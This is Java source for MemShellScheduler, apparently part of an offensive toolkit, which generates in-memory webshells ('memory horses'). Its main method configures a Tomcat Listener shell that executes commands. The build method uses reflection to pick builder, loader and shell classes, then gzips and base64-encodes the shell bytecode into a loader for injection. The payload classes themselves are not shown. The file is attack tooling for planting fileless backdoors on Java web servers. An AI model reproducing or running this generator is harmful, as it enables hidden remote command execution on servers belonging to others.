package com.ppp.scheduler;

import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.*;
import com.ppp.utils.maker.ClassUtils;
import com.ppp.utils.maker.CryptoUtils;

import java.lang.reflect.Method;
import java.util.List;

/**
 * @author Whoopsunix
 * 内存马生成
 */
@JavaClassHelperType(JavaClassHelperType.MemShell)
public class MemShellScheduler {
    private static String builderPackageName = "com.ppp.middleware.builder";
    private static String loaderPackageName = "com.ppp.middleware.loader";
    private static String msPackageName = "com.ppp.middleware.memshell";

    public static void main(String[] args) throws Exception {
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.MemShell);
        javaClassHelper.setMiddleware(Middleware.Tomcat);
        javaClassHelper.setMemShell(MemShell.Listener);
        javaClassHelper.setMemShellFunction(MemShellFunction.Exec);

        // 内存马信息
        javaClassHelper.setHEADER("xxx");


        build(javaClassHelper);
    }

    public static byte[] build(JavaClassHelper javaClassHelper) throws Exception {
        String middleware = javaClassHelper.getMiddleware();
        String memShell = javaClassHelper.getMemShell();
        String memShellFunction = javaClassHelper.getMemShellFunction();
        String javaClassType = javaClassHelper.getJavaClassType();
        String memShellType = javaClassHelper.getMemShellType();

        // 用于打印信息

        /**
         * 获取 MSLoaderBuilder 和 MemShellBuilder
         */
        Class loaderBuilderClass = null;
        Class msBuilderClass = null;

        List<Class<?>> builderClasses = ClassUtils.getClasses(builderPackageName);
        for (Class<?> clazz : builderClasses) {
            Builder builder = clazz.getAnnotation(Builder.class);
            if (builder == null) continue;

            // 获取 Loader Builder
            if (builder.value().equalsIgnoreCase(Builder.Loader)) {
                loaderBuilderClass = clazz;
//                Printer.log("Loader builder Class: " + clazz.getName() + ", Annotation Value: " + builder.value());
            }
            // 获取 MemShell Builder
            if (builder.value().equalsIgnoreCase(Builder.MS)) {
                msBuilderClass = clazz;
//                Printer.log("MemShell builder Class: " + clazz.getName() + ", Annotation Value: " + builder.value());
            }
        }

        // 组件不支持
        if (loaderBuilderClass == null) {
            Printer.error(String.format("Loader builder Class Not Found, Middleware %s is not supported", middleware));
        }
        // 内存马 Builder 未找到
        if (msBuilderClass == null) {
            Printer.error("MemShell builder Class Not Found");
        }

        /**
         *  定位到各自 Builder 的具体生成方法
         *    目前的思路基本都是围绕 msMethod 实现 func 差异
         *    loader 直接获取了，所以 loaderMethod 目前其实是冗余代码，保留是为了提示不支持的内存马组合
         */
        Method msMethod = null;
        Method loaderMethod = null;

        Method[] msMethods = msBuilderClass.getDeclaredMethods();
        for (Method method : msMethods) {
            Middleware middlewareAnnotation = method.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;

            MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            MemShellFunction memShellFunctionAnnotation = method.getAnnotation(MemShellFunction.class);
            if (memShellFunctionAnnotation == null) continue;

            if (
                    middlewareAnnotation.value().equalsIgnoreCase(middleware)
                            && memShellAnnotation.value().equalsIgnoreCase(memShell)
                            && memShellFunctionAnnotation.value().equalsIgnoreCase(memShellFunction)
            ) {
                msMethod = method;
//                Printer.log("MS builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        Method[] loaderMethods = loaderBuilderClass.getDeclaredMethods();
        for (Method method : loaderMethods) {
            Middleware middlewareAnnotation = method.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;

            MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            if (
                    middlewareAnnotation.value().equalsIgnoreCase(middleware)
                            && memShellAnnotation.value().equalsIgnoreCase(memShell)
            ) {
                loaderMethod = method;
//                Printer.log("Loader builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                break;
            }
        }

        /**
         * 获取 Loader 和 MemShell
         */
        Class loaderClass = null;
        Class msClass = null;

        List<Class<?>> loaderClasses = ClassUtils.getClasses(loaderPackageName);
        for (Class<?> clazz : loaderClasses) {
            Middleware middlewareAnnotation = clazz.getAnnotation(Middleware.class);
            if (middlewareAnnotation == null) continue;

            MemShell memShellAnnotation = clazz.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            JavaClassType javaClassTypeAnnotation = clazz.getAnnotation(JavaClassType.class);
            if (javaClassTypeAnnotation == null) continue;

            if (
                    middlewareAnnotation.value().equalsIgnoreCase(middleware)
                            && memShellAnnotation.value().equalsIgnoreCase(memShell)
                    && javaClassTypeAnnotation.value().equalsIgnoreCase(javaClassType)
            ) {
                loaderClass = clazz;
                Printer.log("Loader Class: " + clazz.getName() + ", Annotation Value: " + middlewareAnnotation.value() + " , JavaClassType: " + javaClassTypeAnnotation.value());
                break;
            }
        }

        List<Class<?>> msClasses = ClassUtils.getClasses(msPackageName);
        for (Class<?> clazz : msClasses) {
            MemShell memShellAnnotation = clazz.getAnnotation(MemShell.class);
            if (memShellAnnotation == null) continue;

            MemShellFunction memShellFunctionAnnotation = clazz.getAnnotation(MemShellFunction.class);
            if (memShellFunctionAnnotation == null) continue;

            MemShellType memShellTypeAnnotation = clazz.getAnnotation(MemShellType.class);
            if (memShellTypeAnnotation == null) continue;

            if (
                    memShellAnnotation.value().equalsIgnoreCase(memShell)
                            && memShellFunctionAnnotation.value().equalsIgnoreCase(memShellFunction)
                            && memShellTypeAnnotation.value().equalsIgnoreCase(memShellType)
            ) {
                msClass = clazz;
                Printer.log("MemShell Class: " + clazz.getName() + ", Annotation Value: " + memShellAnnotation.value() + " , MemShellFunction: " + memShellFunctionAnnotation.value() + " , MemShellType: " + memShellTypeAnnotation.value());
                break;
            }

        }

        if (loaderClass == null) {
            Printer.error("Loader Class Not Found");
        }
        // 内存马种类不支持
        if (msClass == null) {
            Printer.error(String.format("The MemShell %s %s is not supported", memShell, memShellFunction));
        }


        /**
         * 生成加载 Loader 和 MemShell
         */
        Object loaderBuilder = loaderBuilderClass.newInstance();
        Object msBuilder = msBuilderClass.newInstance();

        Printer.yellowInfo("ms:");
        byte[] msJavaClassBytes = (byte[]) msMethod.invoke(msBuilder, msClass, javaClassHelper);

        // gzip
        byte[] msJavaClassGzipBytes = CryptoUtils.compress(msJavaClassBytes);
        String msJavaClassGzipBase64 = CryptoUtils.base64encoder(msJavaClassGzipBytes);

        Printer.yellowInfo("ms+loader:");
        javaClassHelper.setLoader(true);
        byte[] msLoaderJavaClassBytes = (byte[]) loaderMethod.invoke(loaderBuilder, loaderClass, msJavaClassGzipBase64, javaClassHelper);

        return msLoaderJavaClassBytes;

    }

}
